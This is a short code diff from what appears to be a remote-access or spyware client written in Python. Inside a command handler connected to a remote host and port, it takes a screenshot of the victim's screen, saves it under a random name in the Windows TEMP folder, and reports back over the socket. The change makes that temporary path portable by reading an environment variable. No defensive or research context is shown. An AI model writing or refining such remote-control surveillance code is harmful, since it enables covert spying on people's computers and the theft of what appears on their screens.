@@ -194,10 +194,11 @@ def q(host, port):
                             ramdom_numbers = random.randint(0, 500)
                             random_string = ''.join(random.choices(string.ascii_uppercase + string.digits, k=size))
                             file_name = f'{random_string}{str(ramdom_numbers)}.png'
-                            file_path = os.path.join(r'C:\Windows\Temp', file_name)
+                            temp_path = os.environ.get('TEMP')
+                            file_path = os.path.join(rf'{temp_path}', file_name)
                             scs = pyautogui.screenshot()
                             scs.save(file_path)
-                            result = f"Print successfully saved in Temp directory with name {file_name}".encode()
+                            result = f"Print successfully saved in Temp directory with name {temp_path}\\{file_name}".encode()
                             p.sendall(result)
 
                         elif command == "SERVER_SHUTDOWN":
